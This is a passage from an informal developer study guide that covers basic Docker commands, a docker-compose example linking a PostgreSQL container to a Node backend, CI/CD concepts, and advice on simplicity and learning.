This says to docker that it should expose its port "3000" to the port "3000" of your local machine (that's why its: "3000:3000").

### See all created containers

You can check all your created containers by writing in your terminal:

```console
docker ps
```

### Enter in the bash

If you previously created a docker and then you decided to run it in the background, you can anyway enter in its batch at any time, by typing the following command:

```console
docker exec -it [CONTAINER ID] bash
```

Where the \[CONTAINER ID] is the ID of your container (you would never have said that), obtained from the `docker ps` command.

### Stopping a container

If you want to execute the exection of a container, you can run the command:

```console
docker stop [CONTAINER ID]
```

## Composer

Usually you never have a project that requires only NodeJS. As we saw in the **Code Analysis** chapter, you have to think also, for example, to the connections with your Databases.
For that, you have to create another container, and then run the same commands, and so on.
BUt, wouldn't be greate if you can manage everything from one place?
For that, there is **Docker Compose**. It's already in your machine if you installed docker.
To create a docker composition, you have to first create a `docker-compose.yml` file in your project's root folder.

Inside of that, you can structurize the file with all your container. Let's see an example:

```yaml
version: '3.8' # Version of the docker-compose

# Your services (containers)
services:
  # PostgreSQL
  postgres:
    container_name: postgres
    # A folder "postgres" must be in your project's root folder
    build: ./postgres
    # Environment variables
    environment:
      POSTGRES_USER: admin
      POSTGRES_PASSWORD: password
      POSTGRES_URL: postgres://admin:password@localhost:5432/smart-brain
      POSTGRES_DB: smart-brain
      POSTGRES_HOST: postgres
    # Exposed ports
    ports: 
      - "5432:5432"

  # Backend
  your-backend-project:
    container_name: backend
    build: ./
    volumes:
      - ./:/usr/src/your-backend-project
    command: npm start
    working_dir: /usr/src/your-backend-project
    ports:
      - "3000:3000"
    environment:
      POSTGRES_URI: postgres://admin:password@postgres:5432/smart-brain
```

Done!
Also, if you previously created a container with a Dockerfile, you surely noted that if you edit your file then you have to build your container again and then re-run it. If you're making contant edits, this could be annoying.
For that, in your compose file I added (inside the container of the backend) the `volumes` configuration, that basically says to "watch" my root folder ("./") and apply all the edits that i make in the filed contained in it in the "/usr/src/your-backend-project" folder of my docker (that's why its: "./:/usr/src/your-backend-project"). Soooo much better.

Here, you can build and run your composer by running the command:

```console
docker-compose build
docker-compose up
```

Or, simply, in one command:

```console
docker-compose up --build
```

This first build the docker-compose, and then run it.
Again, you can add the option `-d` too if you want the docker to be executed in the background (and then run `docker-compose exec your-container bash`).

That's pretty much it :D




# CI/CD

**CI/CD** stands for **Continuous Integration**, **Continuous Delivery** and **Continuous Deployment**.
Continuous integration is a development practice where developers update their code several times and this updates are utomatically "verified" (built, tested, and so on).
The benefit of updating frequently is that you can immediately see where the error is (better lot of small changes than only one with a big change).
Continuous delivery is the practice of keeping your codebase deployable at any time (small incremental changes to the app). This also apply in continuous Deployment, but unlike continuos delivery, the code directly go in production.

This is usually the whole process:

```
Code PR -> Tests -> Build -> Merge -> Acceptance test -> Manual/Auto deploy
```

The difference between Continuous Delivery and Continuous Deployment is the last step: Continuous Deployment have an _automatic deployment_, while in Continuous Delivery it must be _manual_.

There are tools that can help you building this process. The main software is [**CirlceCI**](https://circleci.com/).

Mastering this process is a fundamental knowdledge of a Senior Developer.





# Complexity VS Simplicity

> Always choose Simplicity over complexity. 

Showing your coding skills is never a good option. The secret of the best developers is that they always choose a simple resolution for a problem rather than the complex and maybe "cool" one.
Good code is self-documented. It also minimize bugs.
Of course, sometimes you have to write complex code, but, if you must choose between two options, always choose the simplest one.




# Learn to Learn

The most succesfull people (not just developers) mastered the **Learning process**.
Figure out what is your best way of studying (mine, for example, is writing all this s**t :D).

> Don't compare youself to others

You must learn to learn, expecially if you want to be a developer, because softwares are constantly updating.

Also, always question to yourself **WHY?**.
Why you wanto to learn a certain tool?
Why you want to improve your skills in a certain field?

Never try to know everything about everything. Understand the WHY of each library. Why it has been written.

> Always start with WHY




# Greetings

If you're reading this I really want to say a couple of words to you:

> Man... You're absolutely crazy

How is it even possible?
I don't know, but... Thank you.

Love you <3
